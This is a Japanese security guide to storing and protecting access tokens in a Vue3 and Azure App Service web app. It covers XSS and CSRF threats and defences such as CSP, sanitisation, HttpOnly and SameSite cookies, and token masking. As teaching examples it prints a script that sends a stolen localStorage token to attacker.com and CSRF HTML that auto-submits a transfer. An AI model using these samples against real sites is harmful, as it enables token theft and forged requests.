# セキュリティガイド

## 概要

このドキュメントでは、アクセストークンを扱う際に理解しておくべきセキュリティ脅威とその対策について詳しく解説します。

---

## 主要なセキュリティ脅威

### 1. XSS (Cross-Site Scripting) 攻撃

#### 概要
XSS 攻撃は、攻撃者が悪意のあるスクリプトをウェブページに挿入し、ユーザーのブラウザ上で実行させる攻撃手法です。

#### 攻撃の仕組み

**格納型 XSS (Stored XSS)**
```
1. 攻撃者が掲示板などに悪意のあるスクリプトを投稿
2. スクリプトがデータベースに保存される
3. 他のユーザーがそのページを閲覧
4. 保存されたスクリプトが実行され、トークンが盗まれる
```

**反射型 XSS (Reflected XSS)**
```
1. 攻撃者が悪意のあるURLを作成（例: ?q=<script>...</script>）
2. ユーザーがそのURLをクリック
3. サーバーがパラメータをそのまま HTML に埋め込んで返す
4. スクリプトが実行され、トークンが盗まれる
```

**DOM ベース XSS**
```
1. 攻撃者が悪意のあるURLを作成
2. クライアントサイドの JavaScript が URL パラメータを使って DOM を操作
3. スクリプトが実行され、トークンが盗まれる
```

#### トークンへの影響

XSS 攻撃が成功すると、以下のようにトークンが盗まれる可能性があります：

```javascript
// 攻撃例: localStorage からトークンを盗む
const token = localStorage.getItem('access_token');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ token })
});
```

```javascript
// 攻撃例: sessionStorage からトークンを盗む
const token = sessionStorage.getItem('access_token');
// 攻撃者のサーバーに送信...
```

```javascript
// 攻撃例: メモリ上の変数からトークンを盗む（グローバルスコープの場合）
const token = window.appState.token;
// 攻撃者のサーバーに送信...
```

#### 対策

**1. CSP (Content Security Policy) の設定**

HTTP ヘッダーで CSP を設定し、インラインスクリプトの実行を禁止します。

```
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self'; 
  style-src 'self' 'unsafe-inline'; 
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
```

**Azure AppService での設定例（web.config）**
```xml
<system.webServer>
  <httpProtocol>
    <customHeaders>
      <add name="Content-Security-Policy" 
           value="default-src 'self'; script-src 'self'; object-src 'none';" />
    </customHeaders>
  </httpProtocol>
</system.webServer>
```

**2. 入力のサニタイズ**

ユーザー入力を必ずサニタイズします。

```typescript
// Vue3 での例
import DOMPurify from 'dompurify';

const sanitizeInput = (input: string): string => {
  return DOMPurify.sanitize(input);
};

// 使用例
const userInput = '<script>alert("XSS")</script>';
const safe = sanitizeInput(userInput); // スクリプトタグが削除される
```

**3. トークンの暗号化保存（オプション）**

SessionStorage に保存する場合、暗号化することでセキュリティを向上させることができます。

```typescript
// Web Crypto API を使った暗号化
const encryptToken = async (token: string, key: CryptoKey): Promise<string> => {
  const encoder = new TextEncoder();
  const data = encoder.encode(token);
  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv: crypto.getRandomValues(new Uint8Array(12)) },
    key,
    data
  );
  return btoa(String.fromCharCode(...new Uint8Array(encrypted)));
};

// セッションごとに一意のキーを生成
const sessionKey = await crypto.subtle.generateKey(
  { name: 'AES-GCM', length: 256 },
  false,
  ['encrypt', 'decrypt']
);

// 暗号化して保存
const encryptedToken = await encryptToken(token, sessionKey);
sessionStorage.setItem('token', encryptedToken);
```

**注意**: この方法でも、XSS 攻撃が成功すれば復号化できるため、完全な対策にはなりません。CSP と組み合わせることが重要です。

**4. HttpOnly Cookie の使用**

JavaScript からアクセスできない Cookie を使用します（後述）。

**5. 出力のエスケープ**

Vue3 では `{{ }}` を使うことで自動的にエスケープされますが、`v-html` を使う場合は注意が必要です。

```vue
<!-- 安全: 自動エスケープ -->
<p>{{ userInput }}</p>

<!-- 危険: エスケープされない -->
<div v-html="userInput"></div>

<!-- 安全: サニタイズしてから使用 -->
<div v-html="sanitizeInput(userInput)"></div>
```

#### SessionStorage / Ref 方式のセキュリティリスクと対策

**リスク評価**:
- 🔴 **XSS 攻撃に対して脆弱**: JavaScript からアクセス可能なため、XSS が成功するとトークンが盗まれる
- 🟡 **デバッグログ漏洩**: 不適切なログ出力によりトークンが漏洩する可能性
- 🟡 **トークン有効期限管理**: 期限切れトークンの使用によるセキュリティリスク

**対策 1: CSP の厳格な設定（最重要）**

CSP を適切に設定することで、XSS 攻撃のリスクを大幅に軽減できます。

```
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self'; 
  style-src 'self' 'unsafe-inline'; 
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com https://login.microsoftonline.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
```

**Azure AppService での設定例**:
```xml
<!-- web.config -->
<system.webServer>
  <httpProtocol>
    <customHeaders>
      <add name="Content-Security-Policy" 
           value="default-src 'self'; script-src 'self'; object-src 'none';" />
    </customHeaders>
  </httpProtocol>
</system.webServer>
```

**対策 2: トークンのマスク処理**

デバッグログにトークンが含まれないようにマスクします。

```typescript
const maskToken = (token: string): string => {
  if (!token || token.length < 20) return '***';
  return `${token.substring(0, 10)}...${token.substring(token.length - 5)}`;
};

// ログ出力時
console.log(`Token: ${maskToken(token)}`); // Token: eyJhbGciOi...kpXVCJ9

// Axios interceptor でのログ
axios.interceptors.request.use((config) => {
  const authHeader = config.headers.Authorization;
  if (authHeader) {
    console.debug(`Request with auth: ${maskToken(authHeader)}`);
  }
  return config;
});
```

**対策 3: 自動リフレッシュの実装**

トークンの有効期限を監視し、期限切れ前に自動でリフレッシュします。

```typescript
interface TokenData {
  token: string;
  expiresAt: number; // Unix timestamp
}

const isTokenExpired = (tokenData: TokenData): boolean => {
  // 有効期限の5分前に期限切れと判定
  return Date.now() >= tokenData.expiresAt - 5 * 60 * 1000;
};

const getValidToken = async (): Promise<string> => {
  const cached = getCachedToken(); // SessionStorage or Ref から取得
  
  if (!cached || isTokenExpired(cached)) {
    // /.auth/me から再取得
    const newToken = await fetchTokenFromAuthMe();
    cacheToken(newToken);
    return newToken.token;
  }
  
  return cached.token;
};

// Axios interceptor で使用
axios.interceptors.request.use(async (config) => {
  if (config.url?.startsWith('/api/internal/')) {
    const token = await getValidToken();
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});
```

**対策 4: エラー時のトークンクリア**

認証エラー時にトークンをクリアし、再認証を促します。

```typescript
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    if (error.response?.status === 401) {
      // トークンをクリア
      sessionStorage.removeItem('token');
      
      // リトライ（1回のみ）
      if (!error.config._retry) {
        error.config._retry = true;
        const newToken = await fetchTokenFromAuthMe();
        error.config.headers.Authorization = `Bearer ${newToken.token}`;
        return axios(error.config);
      }
      
      // 再認証に失敗した場合はログイン画面へ
      window.location.href = '/.auth/login/aad';
    }
    return Promise.reject(error);
  }
);
```

#### 保守面の懸念と対策

**懸念 1: バージョン管理とセキュリティパッチ** 🟡

セキュリティパッチをすべてのプロジェクトに展開する必要があります。

**対策**:
- セマンティックバージョニングを採用（`@your-company/ui-library@1.2.3`）
- `CHANGELOG.md` で変更内容を明記
- 重大なセキュリティパッチは社内通知で展開を促す
- Dependabot / Renovate を使って自動アップデート通知

**懸念 2: 後方互換性** 🟡

ライブラリのアップデートで既存プロジェクトが壊れる可能性があります。

**対策**:
```typescript
// 破壊的変更は Major バージョンアップ時のみ
// v1.x.x → v2.0.0

// オプションでレガシーサポートを提供
const axios = createAuthAxios({
  legacyMode: true, // v1 互換モード
  apiVersion: 'v1', // API バージョンを明示
  // ...
});
```

- Major バージョンアップ時は移行ガイドを提供
- 旧バージョンのサポート期間を明示（例: 6ヶ月）

**懸念 3: テストとセキュリティ監査** 🟡

トークン管理のバグがセキュリティ脆弱性に直結します。

**対策**:
```typescript
// ユニットテスト例
describe('Token Management', () => {
  it('should mask token in logs', () => {
    const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9';
    const masked = maskToken(token);
    expect(masked).not.toContain(token);
    expect(masked).toContain('...');
  });
  
  it('should refresh expired token', async () => {
    const expiredToken = { token: 'old', expiresAt: Date.now() - 1000 };
    const newToken = await getValidToken();
    expect(newToken).not.toBe('old');
  });
});
```

- ユニットテスト・E2Eテストを実装
- 社内セキュリティチームによるコードレビュー
- 定期的なペネトレーションテスト（年1回以上）
- OWASP ZAP 等のツールで自動脆弱性スキャン

#### 総合評価

**SessionStorage / Ref 方式は実用的か？**

✅ **はい、適切な対策を講じれば実用的です**

**必須条件**:
1. **CSP を厳格に設定する**（最重要）
2. **ライブラリ内で自動リフレッシュを実装する**
3. **セキュリティ監査を定期的に実施する**
4. **ドキュメントとテストを充実させる**

**結論**: 社内向けUIライブラリとして、SessionStorage 方式は適切です。特に CSP を厳格に設定すれば、十分なセキュリティレベルを確保できます。

---

### 2. CSRF (Cross-Site Request Forgery) 攻撃

#### 概要
CSRF 攻撃は、ユーザーが意図しないリクエストを攻撃者が作成したウェブページから送信させる攻撃手法です。

#### 攻撃の仕組み

```
1. ユーザーが正規サイトにログインしてセッションを確立
2. ユーザーが攻撃者のサイトにアクセス
3. 攻撃者のサイトから正規サイトへのリクエストが自動送信される
4. ブラウザが自動的に Cookie を付与してリクエストが実行される
```

**攻撃例**
```html
<!-- 攻撃者のページ -->
<img src="https://yourapp.com/api/delete-account" />

<!-- または -->
<form action="https://yourapp.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
```

#### Cookie ベース認証での脆弱性

HttpOnly Cookie を使う場合、CSRF 攻撃に対して脆弱になります：

```
正規のリクエスト: ブラウザが自動的に Cookie を付与
攻撃のリクエスト: ブラウザが自動的に Cookie を付与（区別できない！）
```

#### 対策

**1. CSRF トークンの使用**

各リクエストに一意のトークンを含めます。

```typescript
// サーバーサイドで CSRF トークンを生成
// クライアント側で取得
const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');

// API リクエスト時にヘッダーに含める
axios.post('/api/data', data, {
  headers: {
    'X-CSRF-Token': csrfToken
  }
});
```

**2. SameSite Cookie 属性の使用**

Cookie に `SameSite` 属性を設定します。

```
Set-Cookie: session=abc123; SameSite=Strict; HttpOnly; Secure
```

- **Strict**: クロスサイトリクエストでは Cookie が送信されない（最も安全）
- **Lax**: GET リクエストでのトップレベルナビゲーションのみ Cookie を送信
- **None**: すべてのリクエストで Cookie を送信（Secure 属性が必須）

**Azure AppService での設定例**
```typescript
// カスタムミドルウェアで設定
response.setHeader('Set-Cookie', [
  `token=${token}; HttpOnly; Secure; SameSite=Strict; Path=/`
]);
```

**3. カスタムヘッダーの使用**

Authorization ヘッダーなどのカスタムヘッダーは CSRF 攻撃で偽造できません。

```typescript
// これは CSRF 攻撃の影響を受けない
axios.get('/api/data', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});
```

**4. リファラーチェック**

リクエストの Origin / Referer ヘッダーを検証します。

```typescript
// サーバーサイドでの検証例
const allowedOrigins = ['https://yourapp.com'];
const origin = request.headers.origin;

if (!allowedOrigins.includes(origin)) {
  throw new Error('Invalid origin');
}
```

---

### 3. トークンのライフサイクル管理

#### トークンの有効期限

アクセストークンには必ず有効期限を設定し、期限切れの場合は再取得します。

```typescript
interface TokenData {
  accessToken: string;
  expiresAt: number; // Unix timestamp
}

const isTokenExpired = (tokenData: TokenData): boolean => {
  return Date.now() >= tokenData.expiresAt;
};

const getValidToken = async (tokenData: TokenData | null): Promise<string> => {
  if (!tokenData || isTokenExpired(tokenData)) {
    // トークンを再取得
    const newToken = await fetchTokenFromAuthMe();
    return newToken.accessToken;
  }
  return tokenData.accessToken;
};
```

#### トークンのリフレッシュ

トークンが期限切れになる前に自動的にリフレッシュします。

```typescript
// トークンが期限切れの5分前になったらリフレッシュ
const REFRESH_BUFFER = 5 * 60 * 1000; // 5分

const shouldRefreshToken = (tokenData: TokenData): boolean => {
  return Date.now() >= (tokenData.expiresAt - REFRESH_BUFFER);
};
```

---

## HttpOnly Cookie の詳細

### 概要

HttpOnly Cookie は、JavaScript からアクセスできない Cookie です。これにより、XSS 攻撃からトークンを保護できます。

### 設定方法

**サーバーサイドでの設定**
```
Set-Cookie: access_token=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
```

**属性の説明**:
- **HttpOnly**: JavaScript からアクセス不可
- **Secure**: HTTPS 接続でのみ送信
- **SameSite**: CSRF 攻撃への対策
- **Path**: Cookie が送信されるパス
- **Max-Age**: Cookie の有効期限（秒）

### Azure AppService での実装

Azure AppService の Easy Auth は標準で HttpOnly Cookie を使用していますが、カスタムトークンを Cookie に保存する場合は以下のように実装します。

**Azure Functions での例（Node.js）**
```typescript
import { AzureFunction, Context, HttpRequest } from "@azure/functions";

const httpTrigger: AzureFunction = async function (
  context: Context,
  req: HttpRequest
): Promise<void> {
  // /.auth/me からトークンを取得
  const authMeResponse = await fetch(`${req.headers['x-ms-original-url']}/.auth/me`);
  const authData = await authMeResponse.json();
  const accessToken = authData[0].access_token;

  // HttpOnly Cookie に設定
  context.res = {
    status: 200,
    headers: {
      'Set-Cookie': [
        `access_token=${accessToken}; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600`
      ]
    },
    body: { success: true }
  };
};

export default httpTrigger;
```

### クライアントサイドでの使用

HttpOnly Cookie を使う場合、クライアントサイドは Cookie を意識する必要がありません。

```typescript
// Cookie は自動的に送信される
const response = await axios.get('/api/data', {
  withCredentials: true // CORS の場合に必要
});
```

**重要**: バックエンドAPIが Cookie を Authorization ヘッダーに変換する必要があります。

---

## ベストプラクティスまとめ

### 必須対策（すべての方式で実装）

1. ✅ **HTTPS の強制** - すべての通信を暗号化
2. ✅ **CSP の設定** - XSS 攻撃を緩和
3. ✅ **トークンの有効期限管理** - 短い有効期限を設定
4. ✅ **エラーハンドリング** - トークン取得失敗時の適切な処理
5. ✅ **入力のサニタイズ** - ユーザー入力を必ずサニタイズ

### 方式別の推奨対策

| 方式 | 追加の推奨対策 |
|------|--------------|
| **LocalStorage / SessionStorage / IndexedDB** | • CSP を厳格に設定<br>• 定期的なセキュリティ監査<br>• トークンの暗号化保存（可能な場合） |
| **Ref 状態管理 / Web Worker** | • CSP を厳格に設定<br>• グローバルスコープへの露出を避ける |
| **HttpOnly Cookie** | • CSRF トークンの実装<br>• SameSite=Strict の設定<br>• Origin ヘッダーの検証 |
| **BFF パターン** | • BFF のセキュリティ強化<br>• API ゲートウェイの監視<br>• レート制限の実装 |

### セキュリティチェックリスト

開発時に以下をチェックしてください：

- [ ] CSP ヘッダーが設定されているか
- [ ] すべての通信が HTTPS で行われているか
- [ ] ユーザー入力がサニタイズされているか
- [ ] トークンの有効期限が適切に管理されているか
- [ ] XSS 攻撃のテストを実施したか
- [ ] CSRF 攻撃のテストを実施したか（Cookie ベースの場合）
- [ ] エラー時に機密情報が漏洩しないか
- [ ] ログに機密情報が含まれていないか

---

## 参考資料

### XSS 対策
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Content Security Policy (CSP) - MDN](https://developer.mozilla.org/ja/docs/Web/HTTP/CSP)

### CSRF 対策
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [SameSite Cookie - MDN](https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Set-Cookie/SameSite)

### トークン管理
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [Azure App Service の認証と承認](https://learn.microsoft.com/ja-jp/azure/app-service/overview-authentication-authorization)

### セキュリティ全般
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Web セキュリティ基礎](https://developer.mozilla.org/ja/docs/Web/Security)
